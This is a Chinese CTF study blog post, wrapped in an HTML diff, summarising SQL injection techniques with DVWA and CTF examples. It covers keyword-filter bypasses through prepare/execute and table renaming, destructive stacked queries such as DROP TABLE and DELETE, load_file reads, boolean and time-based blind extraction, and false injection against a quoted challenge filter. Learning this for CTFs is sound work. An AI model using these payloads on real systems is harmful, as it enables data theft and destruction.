@@ -1,0 +1,246 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="SAIN"><meta name="copyright" content="SAIN"><meta name="generator" content="Hexo 4.2.1"><meta name="theme" content="hexo-theme-yun"><title>sqlinject | SAIN</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="none" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.8/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1906232_4pz18l23jnx.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"root":"/","title":"云游君的小站","version":"0.9.2","anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><meta name="description" content="sql注入总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlinject">
+<meta property="og:url" content="http://sainfufu.github.io/2020/CTF/sqlinject/index.html">
+<meta property="og:site_name" content="SAIN">
+<meta property="og:description" content="sql注入总结">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-25T06:59:11.000Z">
+<meta property="article:modified_time" content="2020-04-25T03:27:22.000Z">
+<meta property="article:author" content="SAIN">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script defer src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="SAIN"><img width="96" loading="lazy" src="/avatar.jpg" alt="SAIN"></a><div class="site-author-name"><a href="/about/">SAIN</a></div><a class="site-name" href="/about/site.html">SAIN</a><sub class="site-subtitle">记录怪异</sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-shouye"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archives_4px"></use></svg></span><span class="site-state-item-count">111</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-category"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-06Tags"></use></svg></span><span class="site-state-item-count">35</span></a></div><a class="site-state-item hty-icon-button" href="/albums/" title="相册"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-tupianbizhi"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/categories/%E5%AD%A6%E4%B9%A0/" title="学习" style="color:doodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-xuexi"></use></svg></a><a class="links-item hty-icon-button" href="/categories/Eng/" title="英语笔记" style="color:doodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-english"></use></svg></a><a class="links-item hty-icon-button" href="/categories/CS/" title="CS" style="color:doodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-technology_computer-"></use></svg></a><a class="links-item hty-icon-button" href="/categories/CTF/" title="CTF" style="color:doodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hacker"></use></svg></a><a class="links-item hty-icon-button" href="/categories/%E6%9D%82%E6%80%9D/" title="杂思" style="color:doodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rijibendiary"></use></svg></a><a class="links-item hty-icon-button" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" title="读书笔记" style="color:doodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-dushu"></use></svg></a><a class="links-item hty-icon-button" href="/categories/%E8%A7%82%E5%BD%B1%E7%AC%94%E8%AE%B0/" title="观影笔记" style="color:doodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-dianying"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#有过滤"><span class="toc-number">1.</span> <span class="toc-text">有过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">1.1.</span> <span class="toc-text">payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#可以用预编译"><span class="toc-number">1.1.1.</span> <span class="toc-text">可以用预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重命名"><span class="toc-number">1.1.2.</span> <span class="toc-text">重命名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法三"><span class="toc-number">1.1.3.</span> <span class="toc-text">方法三</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆叠注入"><span class="toc-number">2.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用处"><span class="toc-number">2.2.</span> <span class="toc-text">用处</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql盲注"><span class="toc-number">3.</span> <span class="toc-text">sql盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOW-题目"><span class="toc-number">3.1.</span> <span class="toc-text">LOW 题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入举例"><span class="toc-number">3.2.</span> <span class="toc-text">注入举例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#猜用户名"><span class="toc-number">3.2.1.</span> <span class="toc-text">猜用户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#猜数据库名"><span class="toc-number">3.2.2.</span> <span class="toc-text">猜数据库名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#长度"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#字符"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">字符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#猜解数据库中的表名"><span class="toc-number">3.2.2.3.</span> <span class="toc-text">猜解数据库中的表名</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#字段名"><span class="toc-number">3.2.3.</span> <span class="toc-text">字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#猜解数据"><span class="toc-number">3.2.4.</span> <span class="toc-text">猜解数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用基于时间的盲注"><span class="toc-number">3.3.</span> <span class="toc-text">使用基于时间的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#判断是否存在注入，注入是字符型还是数字型"><span class="toc-number">3.3.1.</span> <span class="toc-text">判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#猜解当前数据库名"><span class="toc-number">3.3.2.</span> <span class="toc-text">猜解当前数据库名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#false注入"><span class="toc-number">4.</span> <span class="toc-text">false注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-MYSQL的隐式类型转换"><span class="toc-number">4.1.</span> <span class="toc-text">原理 MYSQL的隐式类型转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实现"><span class="toc-number">4.2.</span> <span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#算术运算"><span class="toc-number">4.2.1.</span> <span class="toc-text">算术运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#位操作运算"><span class="toc-number">4.2.2.</span> <span class="toc-text">位操作运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#比较运算符"><span class="toc-number">4.2.3.</span> <span class="toc-text">比较运算符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#其他"><span class="toc-number">4.2.4.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#综合利用"><span class="toc-number">4.2.5.</span> <span class="toc-text">综合利用</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://sainfufu.github.io/2020/CTF/sqlinject/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="SAIN"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="SAIN"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">sqlinject</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2020-04-25 14:59:11" itemprop="dateCreated datePublished" datetime="2020-04-25T14:59:11+08:00">2020-04-25</time></div><div class="post-classify"><span class="post-category"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span> <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p>sql注入总结</p>
+<a id="more"></a>
+
+<h2 id="有过滤"><a href="#有过滤" class="headerlink" title="有过滤"></a>有过滤</h2><pre><code class="php">preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="可以用预编译"><a href="#可以用预编译" class="headerlink" title="可以用预编译"></a>可以用预编译</h4><p>set用于设置变量名和值<br>prepare用于预备一个语句，并赋予名称，以后可以引用该语句<br>execute执行语句<br>deallocate prepare用来释放掉预处理的语句</p>
+<pre><code>-1&#39;;set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);prepare stmt from @sql;EXECUTE stmt;
+1%27;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare%20execsql%20from%20@a;execute%20execsql;#</code></pre><p>使用了大小写绕过<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code></p>
+<h4 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h4><pre><code>1&#39;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></pre><h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p><code>1&#39;;handler FlagHere open; handler FlagHere read first;</code></p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>就是sql语句<code>;</code>结束后仍然可以执行操作<br>比如<code>1; DELETE FROM products</code></p>
+<h3 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h3><ol>
+<li>加载文件<br><code>select * from users where id=1;select load_file(&#39;c:/tmpupbbn.php&#39;);</code></li>
+<li>删表<br><code>select * from users where id=1;drop table test;</code></li>
+</ol>
+<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p>基于dvwa上的题获得的知识</p>
+<h3 id="LOW-题目"><a href="#LOW-题目" class="headerlink" title="LOW 题目"></a>LOW 题目</h3><pre><code class="php">&lt;?php 
+
+if( isset( $_GET[ &#39;Submit&#39; ] ) ) { 
+    // Get input 
+    $id = $_GET[ &#39;id&#39; ]; 
+
+    // Check database 
+    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors 
+
+    // Get results 
+    $num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors 
+    if( $num &gt; 0 ) { 
+        // Feedback for end user 
+        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; 
+    } 
+    else { 
+        // User wasn&#39;t found, so the page wasn&#39;t! 
+        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); 
+
+        // Feedback for end user 
+        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; 
+    } 
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); 
+} 
+?&gt;</code></pre>
+<p>就是疯狂在那里猜数据库，根据他的反应来判断正确与否</p>
+<h3 id="注入举例"><a href="#注入举例" class="headerlink" title="注入举例"></a>注入举例</h3><h4 id="猜用户名"><a href="#猜用户名" class="headerlink" title="猜用户名"></a>猜用户名</h4><p>随便输几个数或字母，发现<br>1,2,3,4,5是有的用户名</p>
+<h4 id="猜数据库名"><a href="#猜数据库名" class="headerlink" title="猜数据库名"></a>猜数据库名</h4><h5 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h5><pre><code>输入1’ and length(database())=1 #  ，显示不存在；
+
+输入1’ and length(database())=2 #  ，显示不存在；
+
+输入1’ and length(database())=3 #  ，显示不存在；
+
+输入1’ and length(database())=4 #  ，显示存在：</code></pre><h5 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h5><pre><code>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；
+
+输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；
+
+输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；
+
+输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；
+
+输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；
+
+输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</code></pre><h5 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h5><pre><code>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在
+
+1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</code></pre><pre><code>猜解表名：
+
+1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在
+
+1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在
+
+…
+
+1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</code></pre><pre><code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在
+
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在
+
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在
+
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在
+
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在
+说明第一个表的名字的第一个字符为小写字母g</code></pre><h4 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h4><p>首先猜解表中字段的数量：</p>
+<pre><code>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在
+
+…
+
+1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在</code></pre><p>说明users表有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<pre><code>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在
+
+…
+
+1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</code></pre><p>说明users表的第一个字段为7个字符长度。</p>
+<p>采用二分法，即可猜解出所有字段名。</p>
+<h4 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h4><p>同样采用二分法。</p>
+<h3 id="使用基于时间的盲注"><a href="#使用基于时间的盲注" class="headerlink" title="使用基于时间的盲注"></a>使用基于时间的盲注</h3><p>但是比赛时可能会由于服务器的迟缓，导致结果不正确。</p>
+<h4 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h4><pre><code>输入1’ and sleep(5) #，感觉到明显延迟；
+
+输入1 and sleep(5) #，没有延迟</code></pre><p>说明存在字符型的基于时间的盲注。</p>
+<h4 id="猜解当前数据库名"><a href="#猜解当前数据库名" class="headerlink" title="猜解当前数据库名"></a>猜解当前数据库名</h4><p>首先猜解数据名的长度：</p>
+<pre><code>1’ and if(length(database())=1,sleep(5),1) # 没有延迟
+
+1’ and if(length(database())=2,sleep(5),1) # 没有延迟
+
+1’ and if(length(database())=3,sleep(5),1) # 没有延迟
+
+1’ and if(length(database())=4,sleep(5),1) # 明显延迟</code></pre><p>说明数据库名长度为4个字符。</p>
+<p>接着采用二分法猜解数据库名：</p>
+<pre><code>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟
+
+…
+
+1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟
+
+1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟
+</code></pre><p>说明数据库名的第一个字符为小写字母d。</p>
+<p>…</p>
+<p>重复上述步骤，即可猜解出数据库名。</p>
+<h2 id="false注入"><a href="#false注入" class="headerlink" title="false注入"></a>false注入</h2><h3 id="原理-MYSQL的隐式类型转换"><a href="#原理-MYSQL的隐式类型转换" class="headerlink" title="原理 MYSQL的隐式类型转换"></a>原理 MYSQL的隐式类型转换</h3><pre><code>The following rules describe how conversion occurs for comparison operations:
+
+If one or both arguments are NULL, the result of the comparison is NULL, except for the NULL-safe &lt;=&gt; equality comparison operator. For NULL &lt;=&gt; NULL, the result is true. No conversion is needed.
+
+If both arguments in a comparison operation are strings, they are compared as strings.
+
+If both arguments are integers, they are compared as integers.
+
+Hexadecimal values are treated as binary strings if not compared to a number.
+
+If one of the arguments is a TIMESTAMP or DATETIME column and the other argument is a constant, the constant is converted to a timestamp before the comparison is performed. This is done to be more ODBC-friendly. Note that this is not done for the arguments to IN()! To be safe, always use complete datetime, date, or time strings when doing comparisons. For example, to achieve best results when using BETWEEN with date or time values, use CAST() to explicitly convert the values to the desired data type.
+
+If one of the arguments is a decimal value, comparison depends on the other argument. The arguments are compared as decimal values if the other argument is a decimal or integer value, or as floating-point values if the other argument is a floating-point value.
+
+In all other cases, the arguments are compared as floating-point (real) numbers.
+
+如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;=&gt;NULL 会返回1。不做类型转换
+
+两个参数都是字符串，按照字符串比较。不做类型转换
+
+两个参数都是整数，按照整数比较。不做类型转换
+
+如果不与数字进行比较，则将十六进制值视为二进制字符串。
+
+有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳
+
+有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较
+
+所有其他情况下，两个参数都会被转换为浮点数再进行比较
+
+最后那一句话很重要，说明如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</code></pre><p>为什么username=0会导致返回数据了，就是因为这里会将数据转换为浮点数比较，但是字符串转换会出问题，从而返回0使得0=0从而为true得到结果，而后面passwd查询少一组数据的原因就是admin的passwd字段第一个字符是2 从而返回2 并非为0。</p>
+<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><h4 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h4><p>加：+<br><code>&#39;+&#39;, 拼接的语句：where username=&#39;&#39;+&#39;&#39;</code><br>减：-<br><code>&#39;-&#39; 拼接的语句：where username=&#39;&#39;-&#39;&#39;</code><br>乘：*<br><code>&#39;*&#39; 拼接的语句：where username=&#39;&#39;*&#39;&#39;</code><br>除：/<br><code>&#39;/6# 拼接的语句：where username=&#39;&#39;/6#</code><br>取余：%<br><code>&#39;%1# 拼接的语句：where username=&#39;&#39;%1#</code></p>
+<h4 id="位操作运算"><a href="#位操作运算" class="headerlink" title="位操作运算"></a>位操作运算</h4><p>我们可以使用当字符串和数字运算的时候类型转换的问题进行利用</p>
+<p>我们可以用的位运算符有：<br>和运算：&amp;<br><code>&#39;&amp;0# 拼接的语句：where username=&#39;&#39;&amp;0#&#39;</code><br>或运算：|<br><code>&#39;|0# 拼接的语句：where username=&#39;&#39;|0#&#39;</code><br>异或运算：^<br><code>&#39;^0# 拼接的语句：where username=&#39;&#39;^0#&#39;</code><br>移位操作：<br><code>&#39;&lt;&lt;0# &#39;&gt;&gt;0#</code><br>位非（~）：这里位非运算符由于是在表达式之前的</p>
+<h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p>安全等于：&lt;=&gt;<br><code>&#39;=0&lt;=&gt;1# 拼接的语句：where username=&#39;&#39;=0&lt;=&gt;1#&#39;</code><br>不等于&lt;&gt;(!=)<br><code>&#39;=0&lt;&gt;0# 拼接的语句：where username=&#39;&#39;=0&lt;&gt;0#&#39;</code><br>大小于&gt;或&lt;<br><code>&#39;&gt;-1# 拼接的语句：where username=&#39;&#39;&gt;-1#</code></p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><code>&#39;+1 is not null# &#39;in(-1,1)# &#39;not in(1,0)# &#39;like 1# &#39;REGEXP 1# &#39;BETWEEN 1 AND 1# &#39;div 1# &#39;xor 1# &#39;=round(0,1)=&#39;1 &#39;&lt;&gt;ifnull(1,2)=&#39;1</code></p>
+<h4 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h4><p>false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。</p>
+<p>这里举例一道题</p>
+<pre><code class="php">&lt;?php  include(&quot;config.php&quot;);  
+ $conn -&gt;query(&quot;set names utf8&quot;);  
+ function randStr($lenth=32){     
+     $strBase = &quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;;     
+     $str = &quot;&quot;;     
+     while($lenth&gt;0){       
+         $str.=substr($strBase,rand(0,strlen($strBase)-1),1);       
+         $lenth --;     
+      }    
+     return $str; 
+ }  
+ if($install){     
+     $sql = &quot;create table `user` (          `
+         id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,
+         `username` varchar(30) NOT NULL,          
+         `passwd` varchar(32) NOT NULL,          
+         `role` varchar(30) NOT NULL        )
+         ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;;
+
+     if($conn-&gt;query($sql)){        
+         $sql  = &quot;insert into `user`(`username`,`passwd`,`role`) values (&#39;admin&#39;,&#39;&quot;.md5(randStr()).&quot;&#39;,&#39;admin&#39;)&quot;;        $conn -&gt; query($sql);     
+         } 
+}  
+function filter($str){      
+    $filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#39;%09&#39;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#39;%0c&#39;).&quot;|&quot;.urldecode(&#39;%0d&#39;).&quot;|&quot;.urldecode(&#39;%a0&#39;).&quot;/i&quot;;      
+    if(preg_match($filter,$str)){          
+        die(&quot;you can&#39;t input this illegal char!&quot;);      
+    }      
+    return $str;  
+}   
+function show($username){   
+    global $conn;   
+    $sql = &quot;select role from `user` where username =&#39;&quot;.$username.&quot;&#39;&quot;;   
+    $res = $conn -&gt;query($sql);   
+    if($res-&gt;num_rows&gt;0){        
+        echo &quot;$username is &quot;.$res-&gt;fetch_assoc()[&#39;role&#39;];   
+    }
+    else{       
+        die(&quot;Don&#39;t have this user!&quot;);   
+    } 
+}  
+function login($username,$passwd){     
+    global $conn;     
+    global $flag;      
+    $username = trim(strtolower($username));     
+    $passwd = trim(strtolower($passwd));     
+    if($username == &#39;admin&#39;){         
+        die(&quot;you can&#39;t login this as admin!&quot;);     
+    }      
+    $sql = &quot;select * from `user` where username=&#39;&quot;.$conn-&gt;escape_string($username).&quot;&#39; and passwd=&#39;&quot;.$conn-&gt;escape_string($passwd).&quot;&#39;&quot;;     
+    $res = $conn -&gt;query($sql);     
+    if($res-&gt;num_rows&gt;0){         
+        if($res-&gt;fetch_assoc()[&#39;role&#39;] === &#39;admin&#39;) exit($flag);     
+    }
+    else{        
+        echo &quot;sorry,username or passwd error!&quot;;     
+    }  
+}  
+function source(){      
+    highlight_file(__FILE__); 
+}  
+$username = isset($_POST[&#39;username&#39;])?filter($_POST[&#39;username&#39;]):&quot;&quot;; 
+$passwd = isset($_POST[&#39;passwd&#39;])?filter($_POST[&#39;passwd&#39;]):&quot;&quot;;  
+$action = isset($_GET[&#39;action&#39;])?filter($_GET[&#39;action&#39;]):&quot;source&quot;;  
+switch($action){    
+    case &quot;source&quot;: source(); break ;    
+    case &quot;login&quot; : login($username,$passwd);break;    
+    case &quot;show&quot; : show($username);break; 
+}</code></pre>
+<p>我们注意到filter()函数</p>
+<pre><code>$filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#39;%09&#39;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#39;%0c&#39;).&quot;|&quot;.urldecode(&#39;%0d&#39;).&quot;|&quot;.urldecode(&#39;%a0&#39;).&quot;/i&quot;;</code></pre><p>这里看起来过滤的比较多，其中and，or还有&amp;，|都被过滤了，这个时候就可以利用false进行盲注。</p>
+<p>可以在show函数利用查询的时候注入，<br><code>username = &quot;admin&#39;^!(mid((passwd)from(-{pos}))=&#39;{passwd}&#39;)=&#39;1&quot;</code><br>这里官方给出的就是利用异或，其实这里并不需要’admin‘只要是一串字符串就可以</p>
